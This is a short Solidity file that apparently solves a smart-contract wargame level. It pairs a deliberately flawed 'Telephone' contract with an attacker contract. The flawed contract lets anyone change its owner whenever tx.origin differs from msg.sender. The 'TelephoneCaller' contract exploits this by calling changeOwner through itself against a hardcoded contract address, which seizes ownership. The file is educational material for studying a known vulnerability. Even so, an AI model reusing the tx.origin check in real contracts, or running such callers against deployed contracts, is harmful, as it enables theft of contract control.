// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneCaller {

    Telephone telephone = Telephone(0x02fC455BCBcA1f5CF8f4563e6257DFE905Cb4f52);

    function callTelephone(address myAddress) public {

        telephone.changeOwner(myAddress);
    }
}